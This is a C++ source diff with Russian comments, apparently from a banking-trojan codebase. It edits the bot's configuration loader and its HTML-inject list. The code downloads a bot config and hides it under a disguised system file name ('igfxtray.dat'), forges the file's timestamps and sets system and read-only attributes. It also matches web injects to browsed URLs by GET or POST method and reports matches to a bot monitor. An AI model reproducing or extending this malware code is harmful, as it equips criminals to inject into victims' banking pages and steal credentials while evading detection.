@@ -537,7 +537,7 @@ char BOT_CONFIG_NAME[]    = {'\\', 'i', 'g', 'f', 'x', 't', 'r', 'a', 'y', '.', 
 char BOT_CONFIG_NAME_HP[] = {'\\', 'i', 'g', 'f', 'x', 't', 'r', 'a', 'y', 'h', 'p', '.', 'd', 'a', 't',	0 };
 
 
-// Имя файла принудительно установленное
+//  Принудительно установленное Имя файла конфига
 char OtherConfigFileName[MAX_PATH] = "";
 
 //-----------------------------------------------------------------------------
@@ -548,7 +548,7 @@ string Config::GetFileName(bool HightPriority)
 
 	// Пповеряем не установлено ли имя в ручную
 	if (!HightPriority  && !AnsiStr::IsEmpty(OtherConfigFileName))
-		return OtherConfigFileName ;
+		return OtherConfigFileName;
 
 	// Собираем имя файла
 	string FileName(MAX_PATH);
@@ -611,15 +611,14 @@ bool Config::Download(PCHAR URL)
 	// Записываем данные в файл
 	if (Result)
 	{
-		PWCHAR FileName = GetFileName();
+		string FileName = GetFileName();
 
-		pSetFileAttributesW(FileName, FILE_ATTRIBUTE_ARCHIVE);
+		pSetFileAttributesA(FileName.t_str(), FILE_ATTRIBUTE_ARCHIVE);
 
-		File::WriteBufferW(FileName, Buf, STR::Length(Buf));
+		File::WriteBufferA(FileName.t_str(), Buf, STR::Length(Buf));
 
-		SetFakeFileDateTimeW(FileName);
-		pSetFileAttributesW(FileName,
-			FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_READONLY);
+		SetFakeFileDateTime(FileName.t_str());
+		pSetFileAttributesA(FileName.t_str(), FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_READONLY);
 	}
 
 	STR::Free(Buf);
@@ -629,33 +628,33 @@ bool Config::Download(PCHAR URL)
 
 // ----------------------------------------------------------------------------
 
-TBotConfig* Config::Initialize(PWCHAR FileName, bool IsNewApplication, bool DontLoad)
-{
-	// Инициализировать настройки бота
-	if (IsNewApplication)
-	{
-		BotConfig = NULL;
-	}
-
-	if (BotConfig == NULL)
-	{
-		BotConfig = Create();
-		if (!DontLoad)
-		{
-			if (FileName == NULL)
-			{
-				FileName = GetFileName(true);
-				if (!FileExistsW(FileName))
-					FileName = GetFileName();
-			}
-
-			LoadConfigFromFile(BotConfig, FileName);
-		}
-	}
-
-	return BotConfig;
-
-}
+//TBotConfig* Config::Initialize(PWCHAR FileName, bool IsNewApplication, bool DontLoad)
+//{
+//	// Инициализировать настройки бота
+//	if (IsNewApplication)
+//	{
+//		BotConfig = NULL;
+//	}
+//
+//	if (BotConfig == NULL)
+//	{
+//		BotConfig = Create();
+//		if (!DontLoad)
+//		{
+//			if (FileName == NULL)
+//			{
+//				FileName = GetFileName(true);
+//				if (!FileExistsW(FileName))
+//					FileName = GetFileName();
+//			}
+//
+//			LoadConfigFromFile(BotConfig, FileName);
+//		}
+//	}
+//
+//	return BotConfig;
+//
+//}
 
 // ----------------------------------------------------------------------------
 TBotConfig* Config::Initialize(PCHAR FileName)
@@ -672,10 +671,18 @@ TBotConfig* Config::Initialize(PCHAR FileName)
 		BotConfig = new TBotConfig();
 
 		// Загружаем данные из файла
-		string FN = (STRA::IsEmpty(FileName))? NULL : FileName;
+        string FN;
+		if (FileExistsA(FileName))
+			FN = FileName;
+		else
+		{
+			// Получаем имя файла по умолчанию
+			FN = GetFileName(true);
+			if (!FileExistsA(FN.t_str()))
+			   FN = GetFileName(false);
+		}
 
-		if (FN)
-            BotConfig->LoadFromFile(FileName);
+        BotConfig->LoadFromFile(FN);
 	}
 
     return BotConfig;
@@ -683,7 +690,7 @@ TBotConfig* Config::Initialize(PCHAR FileName)
 
 // ----------------------------------------------------------------------------
 
-PBotConfig Config::GetConfig()
+TBotConfig* Config::GetConfig()
 {
 	// Функция возвращает на конфиг бота
 	return BotConfig;
@@ -1111,8 +1118,8 @@ void THTMLInjectList::Clear()
 
 bool THTMLInjectList::LoadFromMem(LPVOID Buf, DWORD BufSize)
 {
-	Clear()
-	if Buf == NULL || BufSize == 0)
+	Clear();
+	if (Buf == NULL || BufSize == 0)
 		return false;
 }
 
@@ -1125,19 +1132,19 @@ void THTMLInjectList::ReleaseInjects(PList Injects)
 
     Lock();
 
-	for (DWORD i = List::Count(List); i > 0; i--)
+	for (DWORD i = List::Count(Injects); i > 0; i--)
 	{
-		THTMLInject *Inject = (THTMLInject*)List::GetItem(List, i);
+		THTMLInject *Inject = (THTMLInject*)List::GetItem(Injects, i);
 		if (!Inject) break;
 
-		if (Inject->RefCount > 0)
-			Inject->RefCount--;
-		if (Inject->RefCount == 0 && Inject->DestroyAfterRelease)
-			FreeInject(Inject);
+//		if (Inject->RefCount > 0)
+//			Inject->RefCount--;
+//		if (Inject->RefCount == 0 && Inject->DestroyAfterRelease)
+//			FreeInject(Inject);
 
 	}
 
-	List::Clear(List);
+	List::Clear(Injects);
 
 	Unlock();
 }
@@ -1164,7 +1171,7 @@ bool THTMLInjectList::GetInjectsForURL(THTTPMethod Method, const char *URL, PLis
 		// Сравниваем методы и ссылки
 		if (Method == hmGET && Inject->GET || Method == hmPOST && Inject->POST)
 
-			if (CompareUrl(Inject->URL.t_str(), URL))
+			if (CompareUrl((PCHAR)Inject->URL.t_str(), (PCHAR)URL))
 			{
 				Result = true;
 
@@ -1182,20 +1189,13 @@ bool THTMLInjectList::GetInjectsForURL(THTTPMethod Method, const char *URL, PLis
 					BotMonitor::SendMessage((PCHAR)BotMonitor::ConfigMaskExec, (PCHAR)&Inject->ID, sizeof(Inject->ID));
 				#endif
 
-				if (Request->Injects == NULL)
-					Request->Injects = List::Create();
 
-				List::Add(Request->Injects, Inject);
+				List::Add(List, Inject);
 				Inject->RefCount++; // Увеличиваем счётчик использований инжекта
-				Request->IsInject = true;
 			}
 	}
-	//
-	if (DelURL)
-		STR::Free(URL);
 
-	return Request->IsInject;
-
+	return Result;
 }
 
 
